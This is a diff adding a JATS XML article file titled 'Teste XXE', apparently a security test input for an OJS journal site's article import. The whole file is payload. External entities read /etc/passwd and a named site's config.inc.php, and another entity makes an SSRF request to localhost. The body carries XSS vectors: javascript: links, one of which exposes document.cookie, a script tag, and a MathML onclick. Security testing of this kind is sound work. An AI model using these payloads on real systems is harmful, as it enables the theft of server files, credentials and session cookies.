@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE article [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY xxeconfig SYSTEM "file:///home/ojsbrcom/public_html/treinamento.ojsbr.com/config.inc.php">
+  <!ENTITY rede SYSTEM "http://127.0.0.1:9/xxe">
+]>
+<article xmlns:xlink="http://www.w3.org/1999/xlink" article-type="research-article" xml:lang="pt">
+  <front>
+    <article-meta>
+      <title-group><article-title>Teste XXE: [&xxe;]</article-title></title-group>
+      <abstract><p>Config: [&xxeconfig;] Rede: [&rede;]</p></abstract>
+    </article-meta>
+  </front>
+  <body>
+    <sec><title>Corpo</title>
+      <p>Se aparecer "root:x:0:0" ou "password" nesta página, o XXE funcionou: [&xxe;]</p>
+      <p><ext-link xlink:href="javascript:alert(document.cookie)">link javascript</ext-link> <ext-link xlink:href="data:text/html,oi">link data</ext-link></p>
+      <p><graphic xlink:href="javascript:alert(1)"/></p>
+      <p><named-content content-type="x"><script>alert(1)</script></named-content> <inline-formula><mml:math xmlns:mml="http://www.w3.org/1998/Math/MathML"><mml:mi onclick="alert(1)" href="javascript:alert(2)" mathvariant="bold">x</mml:mi></mml:math></inline-formula></p>
+    </sec>
+  </body>
+</article>
